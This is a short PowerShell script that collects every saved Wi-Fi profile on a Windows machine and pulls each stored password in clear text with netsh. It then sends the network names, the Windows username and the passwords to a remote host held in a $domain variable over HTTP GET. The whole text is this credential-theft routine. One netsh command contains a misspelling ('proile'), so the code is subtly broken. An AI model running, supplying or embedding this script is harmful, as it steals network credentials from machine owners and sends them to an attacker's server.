netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
	$wlan = $_.Matches.Value
	$pass = netsh wlan show proile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'

	Invoke-RestMethod -Uri "$domain/username=$env:username&password=$pass&wlan=$wlan" -Method GET

}
